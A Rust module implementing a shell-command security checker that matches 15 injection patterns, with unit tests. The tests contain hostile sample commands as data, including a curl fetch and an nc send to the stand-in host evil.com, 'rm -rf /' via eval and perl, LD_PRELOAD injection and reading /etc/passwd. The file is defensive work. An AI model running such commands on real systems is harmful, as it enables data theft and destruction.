use regex::Regex;
use std::sync::LazyLock;

/// Security verdict for a shell command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SecurityVerdict {
    Safe,
    Blocked { pattern: String, reason: String },
    NeedsConfirmation { pattern: String, reason: String },
}

impl SecurityVerdict {
    pub fn is_safe(&self) -> bool {
        matches!(self, SecurityVerdict::Safe)
    }
}

/// Injection pattern definition.
struct InjectionPattern {
    regex: &'static LazyLock<Regex>,
    name: &'static str,
    description: &'static str,
    verdict: VerdictKind,
    /// If true, match against raw command (don't strip quotes first).
    /// Used for structural patterns like `awk ... system()` where the program
    /// text is always in quotes but still dangerous.
    match_raw: bool,
}

#[derive(Clone, Copy)]
enum VerdictKind {
    Block,
    Confirm,
}

macro_rules! static_regex {
    ($name:ident, $pat:expr) => {
        static $name: LazyLock<Regex> = LazyLock::new(|| Regex::new($pat).unwrap());
    };
}

static_regex!(RE_CMD_SUBST, r"\$\(");
static_regex!(RE_PARAM_EXPAND, r"\$\{[^}]*[!:/#%]");
static_regex!(RE_PROC_SUBST_IN, r"<\(");
static_regex!(RE_PROC_SUBST_OUT, r">\(");
static_regex!(RE_PROC_SUBST_ZSH, r"=\(");
static_regex!(RE_ARITH_LEGACY, r"\$\[");
static_regex!(RE_ZSH_EQUALS, r"(?:^|[\s;&|])=[a-zA-Z_]");
static_regex!(RE_EVAL, r"(?:^|[\s;&|])(?:eval|source)\s");
static_regex!(RE_XARGS_EXEC, r"xargs\s+.*(?:sh|bash|zsh|dash|ksh)\s+(?:-c|-e)");
static_regex!(RE_FIND_EXEC, r"find\s.*-exec\s");
static_regex!(RE_AWK_SYSTEM, r"awk\s.*\bsystem\s*\(");
static_regex!(RE_PATH_HIJACK, r"(?:^|[\s;&|])PATH\s*=");
static_regex!(RE_LD_PRELOAD, r"(?:^|[\s;&|])(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH)\s*=");
static_regex!(RE_PERL_EXEC, r"perl\s+-e\s");
static_regex!(RE_PYTHON_EXEC, r"python[23]?\s+-c\s");

const PATTERNS: &[InjectionPattern] = &[
    InjectionPattern {
        regex: &RE_CMD_SUBST,
        name: "command_substitution",
        description: "$() command substitution allows arbitrary code execution",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_PARAM_EXPAND,
        name: "dangerous_param_expansion",
        description: "${} with operators (!, :, /, #, %) can execute arbitrary code",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_PROC_SUBST_IN,
        name: "process_substitution_in",
        description: "<() process substitution spawns a subshell",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_PROC_SUBST_OUT,
        name: "process_substitution_out",
        description: ">() process substitution spawns a subshell",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_PROC_SUBST_ZSH,
        name: "zsh_process_substitution",
        description: "=() Zsh process substitution creates temp file from command output",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_ARITH_LEGACY,
        name: "legacy_arithmetic",
        description: "$[] legacy arithmetic can be exploited for code execution",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_ZSH_EQUALS,
        name: "zsh_equals_expansion",
        description: "=cmd Zsh equals expansion resolves to command path",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_EVAL,
        name: "eval_source",
        description: "eval/source executes arbitrary strings as code",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_XARGS_EXEC,
        name: "xargs_shell",
        description: "xargs piping to shell interpreter allows arbitrary execution",
        verdict: VerdictKind::Block,
        match_raw: true,
    },
    InjectionPattern {
        regex: &RE_FIND_EXEC,
        name: "find_exec",
        description: "find -exec runs commands on matched files",
        verdict: VerdictKind::Confirm,
        match_raw: true,
    },
    InjectionPattern {
        regex: &RE_AWK_SYSTEM,
        name: "awk_system",
        description: "awk system() executes shell commands from within awk",
        verdict: VerdictKind::Block,
        match_raw: true,
    },
    InjectionPattern {
        regex: &RE_PATH_HIJACK,
        name: "path_hijack",
        description: "PATH= modification can redirect command resolution to malicious binaries",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_LD_PRELOAD,
        name: "library_injection",
        description: "LD_PRELOAD/DYLD_INSERT_LIBRARIES injects shared libraries into processes",
        verdict: VerdictKind::Block,
        match_raw: false,
    },
    InjectionPattern {
        regex: &RE_PERL_EXEC,
        name: "perl_inline",
        description: "perl -e executes arbitrary Perl code",
        verdict: VerdictKind::Confirm,
        match_raw: true,
    },
    InjectionPattern {
        regex: &RE_PYTHON_EXEC,
        name: "python_inline",
        description: "python -c executes arbitrary Python code",
        verdict: VerdictKind::Confirm,
        match_raw: true,
    },
];

/// Wrapper commands that are safe to strip before security analysis.
const SAFE_WRAPPERS: &[&str] = &[
    "timeout", "time", "nice", "nohup", "stdbuf", "env",
    "ionice", "chrt", "taskset", "numactl",
];

/// Shell security checker: detects 15 injection/substitution patterns.
///
/// Single-quoted regions are stripped before analysis because their content
/// is treated literally by POSIX shells.
pub struct ShellSecurityChecker;

impl ShellSecurityChecker {
    /// Check a command for injection patterns.
    ///
    /// Returns `SecurityVerdict::Safe` if no patterns match,
    /// `Blocked` or `NeedsConfirmation` for the first matching pattern.
    pub fn check(command: &str) -> SecurityVerdict {
        let stripped = strip_wrappers(command);
        let unquoted = strip_single_quoted_regions(&stripped);

        // Backtick detection (special: not regex-based for performance)
        if contains_unescaped_backticks(&unquoted) {
            return SecurityVerdict::Blocked {
                pattern: "backtick_substitution".into(),
                reason: "backtick command substitution allows arbitrary code execution".into(),
            };
        }

        for pat in PATTERNS {
            let target = if pat.match_raw { &stripped } else { &unquoted };
            if pat.regex.is_match(target) {
                return match pat.verdict {
                    VerdictKind::Block => SecurityVerdict::Blocked {
                        pattern: pat.name.into(),
                        reason: pat.description.into(),
                    },
                    VerdictKind::Confirm => SecurityVerdict::NeedsConfirmation {
                        pattern: pat.name.into(),
                        reason: pat.description.into(),
                    },
                };
            }
        }

        SecurityVerdict::Safe
    }

    /// Batch-check: returns all matching patterns (not just the first).
    pub fn check_all(command: &str) -> Vec<SecurityVerdict> {
        let stripped = strip_wrappers(command);
        let unquoted = strip_single_quoted_regions(&stripped);
        let mut results = Vec::new();

        if contains_unescaped_backticks(&unquoted) {
            results.push(SecurityVerdict::Blocked {
                pattern: "backtick_substitution".into(),
                reason: "backtick command substitution allows arbitrary code execution".into(),
            });
        }

        for pat in PATTERNS {
            let target = if pat.match_raw { &stripped } else { &unquoted };
            if pat.regex.is_match(target) {
                let verdict = match pat.verdict {
                    VerdictKind::Block => SecurityVerdict::Blocked {
                        pattern: pat.name.into(),
                        reason: pat.description.into(),
                    },
                    VerdictKind::Confirm => SecurityVerdict::NeedsConfirmation {
                        pattern: pat.name.into(),
                        reason: pat.description.into(),
                    },
                };
                results.push(verdict);
            }
        }

        results
    }
}

/// Strip safe wrapper commands (timeout, nice, env, etc.) from the front of a command.
///
/// Handles:
/// - `timeout 30 <cmd>` → `<cmd>`
/// - `env VAR=val <cmd>` → `<cmd>` (but preserves env hijack vars for detection)
/// - `nice -n 10 <cmd>` → `<cmd>`
/// - Chained wrappers: `timeout 30 nice -n 5 <cmd>` → `<cmd>`
pub fn strip_wrappers(command: &str) -> String {
    let mut remaining = command.trim().to_string();

    loop {
        let tokens: Vec<&str> = remaining.splitn(2, char::is_whitespace).collect();
        if tokens.is_empty() {
            break;
        }

        let cmd = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);

        if !SAFE_WRAPPERS.contains(&cmd) {
            break;
        }

        let rest = tokens.get(1).map(|s| s.trim_start()).unwrap_or("");

        match cmd {
            "timeout" => {
                // timeout [opts] DURATION cmd...
                // Skip tokens until we find one that doesn't look like an option or duration
                let parts: Vec<&str> = rest.split_whitespace().collect();
                let mut skip = 0;
                for &part in &parts {
                    if part.starts_with('-') {
                        skip += 1;
                    } else if part.parse::<f64>().is_ok()
                        || part.ends_with('s')
                        || part.ends_with('m')
                        || part.ends_with('h')
                    {
                        skip += 1;
                        break;
                    } else {
                        break;
                    }
                }
                remaining = parts[skip..].join(" ");
            }
            "nice" | "ionice" | "chrt" | "taskset" | "numactl" => {
                // Skip flags and their arguments
                let parts: Vec<&str> = rest.split_whitespace().collect();
                let mut skip = 0;
                for &part in &parts {
                    if part.starts_with('-') {
                        skip += 1;
                        // -n, -p, etc. take a value
                        if part.len() == 2 {
                            skip += 1;
                        }
                    } else {
                        break;
                    }
                }
                remaining = parts[skip.min(parts.len())..].join(" ");
            }
            "env" => {
                // env [VAR=val]... cmd
                let parts: Vec<&str> = rest.split_whitespace().collect();
                let mut skip = 0;
                for &part in &parts {
                    if part.starts_with('-') || part.contains('=') {
                        skip += 1;
                    } else {
                        break;
                    }
                }
                remaining = parts[skip..].join(" ");
            }
            "nohup" | "stdbuf" | "time" => {
                remaining = rest.to_string();
            }
            _ => break,
        }

        if remaining.is_empty() {
            break;
        }
    }

    remaining
}

/// Strip single-quoted regions from a string.
///
/// Content between single quotes is literal in POSIX shells (no expansion),
/// so injection patterns inside them are safe.
pub fn strip_single_quoted_regions(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let bytes = s.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        let ch = bytes[i] as char;

        if !in_single_quote && !in_double_quote && ch == '\\' && i + 1 < bytes.len() {
            result.push(ch);
            result.push(bytes[i + 1] as char);
            i += 2;
            continue;
        }

        if ch == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            i += 1;
            continue;
        }

        if ch == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            result.push(ch);
            i += 1;
            continue;
        }

        if !in_single_quote {
            result.push(ch);
        }
        i += 1;
    }

    result
}

/// Check for unescaped backticks (command substitution).
fn contains_unescaped_backticks(s: &str) -> bool {
    let bytes = s.as_bytes();
    for i in 0..bytes.len() {
        if bytes[i] == b'`' {
            let mut backslashes = 0;
            let mut j = i;
            while j > 0 && bytes[j - 1] == b'\\' {
                backslashes += 1;
                j -= 1;
            }
            if backslashes % 2 == 0 {
                return true;
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── $() command substitution (3 tests) ──────────────────────────

    #[test]
    fn blocks_simple_command_substitution() {
        let v = ShellSecurityChecker::check("echo $(whoami)");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "command_substitution"));
    }

    #[test]
    fn blocks_nested_command_substitution() {
        let v = ShellSecurityChecker::check("echo $(cat $(find / -name passwd))");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "command_substitution"));
    }

    #[test]
    fn safe_dollar_paren_in_single_quotes() {
        let v = ShellSecurityChecker::check("echo '$(not executed)'");
        assert!(v.is_safe());
    }

    // ── Backtick substitution (3 tests) ─────────────────────────────

    #[test]
    fn blocks_backtick_substitution() {
        let v = ShellSecurityChecker::check("echo `whoami`");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "backtick_substitution"));
    }

    #[test]
    fn blocks_backtick_nested() {
        let v = ShellSecurityChecker::check("result=`cat \\`which ls\\``");
        assert!(matches!(v, SecurityVerdict::Blocked { .. }));
    }

    #[test]
    fn safe_escaped_backtick() {
        let v = ShellSecurityChecker::check("echo \\`not executed\\`");
        assert!(v.is_safe());
    }

    // ── ${} dangerous param expansion (3 tests) ─────────────────────

    #[test]
    fn blocks_param_expansion_slice() {
        let v = ShellSecurityChecker::check("echo ${PATH:0:5}");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "dangerous_param_expansion"));
    }

    #[test]
    fn blocks_param_expansion_replace() {
        let v = ShellSecurityChecker::check("echo ${var//pattern/replacement}");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "dangerous_param_expansion"));
    }

    #[test]
    fn safe_simple_variable() {
        let v = ShellSecurityChecker::check("echo $HOME");
        assert!(v.is_safe());
    }

    // ── <() process substitution (3 tests) ──────────────────────────

    #[test]
    fn blocks_process_substitution_in() {
        let v = ShellSecurityChecker::check("diff <(ls dir1) <(ls dir2)");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_in"));
    }

    #[test]
    fn blocks_process_sub_with_pipe() {
        let v = ShellSecurityChecker::check("cat <(curl http://evil.com)");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_in"));
    }

    #[test]
    fn safe_less_than_redirect() {
        let v = ShellSecurityChecker::check("cat < file.txt");
        assert!(v.is_safe());
    }

    // ── >() process substitution (3 tests) ──────────────────────────

    #[test]
    fn blocks_process_substitution_out() {
        let v = ShellSecurityChecker::check("tee >(logger)");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "process_substitution_out"));
    }

    #[test]
    fn blocks_process_sub_out_complex() {
        let v = ShellSecurityChecker::check("echo data | tee >(nc evil.com 9999)");
        assert!(matches!(v, SecurityVerdict::Blocked { .. }));
    }

    #[test]
    fn safe_redirect_to_file() {
        // > followed by space and filename, not >(
        let v = ShellSecurityChecker::check("ls > output.txt");
        assert!(v.is_safe());
    }

    // ── =() Zsh process substitution (3 tests) ─────────────────────

    #[test]
    fn blocks_zsh_equals_process_sub() {
        let v = ShellSecurityChecker::check("vim =(curl http://evil.com/payload)");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "zsh_process_substitution"));
    }

    #[test]
    fn blocks_zsh_equals_sub_nested() {
        let v = ShellSecurityChecker::check("diff =(sort file1) =(sort file2)");
        assert!(matches!(v, SecurityVerdict::Blocked { .. }));
    }

    #[test]
    fn safe_equals_assignment() {
        let v = ShellSecurityChecker::check("x=hello");
        assert!(v.is_safe());
    }

    // ── eval/source (3 tests) ───────────────────────────────────────

    #[test]
    fn blocks_eval() {
        let v = ShellSecurityChecker::check("eval \"rm -rf /\"");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
    }

    #[test]
    fn blocks_source() {
        let v = ShellSecurityChecker::check("source /tmp/malicious.sh");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
    }

    #[test]
    fn blocks_eval_in_chain() {
        let v = ShellSecurityChecker::check("true && eval $payload");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
    }

    // ── xargs → shell (3 tests) ─────────────────────────────────────

    #[test]
    fn blocks_xargs_bash() {
        let v = ShellSecurityChecker::check("echo 'cmd' | xargs bash -c 'echo hello'");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "xargs_shell"));
    }

    #[test]
    fn blocks_xargs_sh() {
        let v = ShellSecurityChecker::check("cat cmds.txt | xargs -I {} sh -c '{}'");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "xargs_shell"));
    }

    #[test]
    fn safe_xargs_rm() {
        let v = ShellSecurityChecker::check("find . -name '*.tmp' | xargs rm");
        assert!(v.is_safe());
    }

    // ── find -exec (3 tests) ────────────────────────────────────────

    #[test]
    fn confirms_find_exec() {
        let v = ShellSecurityChecker::check("find /tmp -name '*.sh' -exec chmod +x {} \\;");
        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "find_exec"));
    }

    #[test]
    fn confirms_find_exec_rm() {
        let v = ShellSecurityChecker::check("find . -type f -exec rm {} +");
        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "find_exec"));
    }

    #[test]
    fn safe_find_no_exec() {
        let v = ShellSecurityChecker::check("find . -name '*.rs' -type f");
        assert!(v.is_safe());
    }

    // ── awk system() (3 tests) ──────────────────────────────────────

    #[test]
    fn blocks_awk_system() {
        let v = ShellSecurityChecker::check("awk '{system(\"rm \" $1)}' files.txt");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "awk_system"));
    }

    #[test]
    fn blocks_awk_system_inline() {
        let v = ShellSecurityChecker::check("ls | awk '{ system(\"cat \" $0) }'");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "awk_system"));
    }

    #[test]
    fn safe_awk_print() {
        let v = ShellSecurityChecker::check("awk '{print $1}' data.txt");
        assert!(v.is_safe());
    }

    // ── PATH= hijack (3 tests) ─────────────────────────────────────

    #[test]
    fn blocks_path_hijack() {
        let v = ShellSecurityChecker::check("PATH=/tmp/evil:$PATH ls");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "path_hijack"));
    }

    #[test]
    fn blocks_path_hijack_in_chain() {
        let v = ShellSecurityChecker::check("true; PATH=/tmp/evil ls");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "path_hijack"));
    }

    #[test]
    fn safe_path_reference() {
        let v = ShellSecurityChecker::check("echo $PATH");
        assert!(v.is_safe());
    }

    // ── LD_PRELOAD/DYLD (3 tests) ──────────────────────────────────

    #[test]
    fn blocks_ld_preload() {
        let v = ShellSecurityChecker::check("LD_PRELOAD=/tmp/evil.so ls");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection"));
    }

    #[test]
    fn blocks_dyld_insert() {
        let v = ShellSecurityChecker::check("DYLD_INSERT_LIBRARIES=/tmp/hook.dylib ./app");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection"));
    }

    #[test]
    fn blocks_ld_library_path() {
        let v = ShellSecurityChecker::check("LD_LIBRARY_PATH=/evil ./target");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "library_injection"));
    }

    // ── perl -e (3 tests) ───────────────────────────────────────────

    #[test]
    fn confirms_perl_exec() {
        let v = ShellSecurityChecker::check("perl -e 'system(\"rm -rf /\")'");
        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "perl_inline"));
    }

    #[test]
    fn confirms_perl_oneliner() {
        let v = ShellSecurityChecker::check("perl -e 'print 42'");
        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "perl_inline"));
    }

    #[test]
    fn safe_perl_script() {
        let v = ShellSecurityChecker::check("perl script.pl");
        assert!(v.is_safe());
    }

    // ── python -c (3 tests) ─────────────────────────────────────────

    #[test]
    fn confirms_python_exec() {
        let v = ShellSecurityChecker::check("python3 -c 'import os; os.system(\"id\")'");
        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "python_inline"));
    }

    #[test]
    fn confirms_python2_exec() {
        let v = ShellSecurityChecker::check("python -c 'print(1+1)'");
        assert!(matches!(v, SecurityVerdict::NeedsConfirmation { ref pattern, .. } if pattern == "python_inline"));
    }

    #[test]
    fn safe_python_script() {
        let v = ShellSecurityChecker::check("python3 script.py");
        assert!(v.is_safe());
    }

    // ── $[] legacy arithmetic (3 tests) ────────────────────────────

    #[test]
    fn blocks_legacy_arithmetic() {
        let v = ShellSecurityChecker::check("echo $[1+1]");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "legacy_arithmetic"));
    }

    #[test]
    fn blocks_legacy_arith_complex() {
        let v = ShellSecurityChecker::check("x=$[RANDOM % 10]");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "legacy_arithmetic"));
    }

    #[test]
    fn safe_dollar_bracket_in_quotes() {
        let v = ShellSecurityChecker::check("echo '$[not expanded]'");
        assert!(v.is_safe());
    }

    // ── strip_wrappers (6 tests) ────────────────────────────────────

    #[test]
    fn strip_timeout() {
        assert_eq!(strip_wrappers("timeout 30 ls -la"), "ls -la");
    }

    #[test]
    fn strip_timeout_with_suffix() {
        assert_eq!(strip_wrappers("timeout 5s curl http://example.com"), "curl http://example.com");
    }

    #[test]
    fn strip_nice() {
        assert_eq!(strip_wrappers("nice -n 10 make -j4"), "make -j4");
    }

    #[test]
    fn strip_env_with_vars() {
        assert_eq!(strip_wrappers("env FOO=bar BAZ=qux ls"), "ls");
    }

    #[test]
    fn strip_chained_wrappers() {
        assert_eq!(strip_wrappers("timeout 30 nice -n 5 env FOO=1 cargo test"), "cargo test");
    }

    #[test]
    fn strip_nohup() {
        assert_eq!(strip_wrappers("nohup ./server &"), "./server &");
    }

    // ── Integration / edge cases ────────────────────────────────────

    #[test]
    fn safe_normal_command() {
        assert!(ShellSecurityChecker::check("ls -la /tmp").is_safe());
    }

    #[test]
    fn safe_pipe_chain() {
        assert!(ShellSecurityChecker::check("cat file.txt | grep pattern | wc -l").is_safe());
    }

    #[test]
    fn safe_git_status() {
        assert!(ShellSecurityChecker::check("git status && git diff").is_safe());
    }

    #[test]
    fn blocks_through_wrapper() {
        let v = ShellSecurityChecker::check("timeout 30 eval 'rm -rf /'");
        assert!(matches!(v, SecurityVerdict::Blocked { ref pattern, .. } if pattern == "eval_source"));
    }

    #[test]
    fn check_all_returns_multiple() {
        let results = ShellSecurityChecker::check_all("eval $(cat /etc/passwd)");
        assert!(results.len() >= 2);
    }

    #[test]
    fn safe_single_quoted_injection_attempts() {
        assert!(ShellSecurityChecker::check("echo 'eval $(rm -rf /) `dangerous`'").is_safe());
    }
}
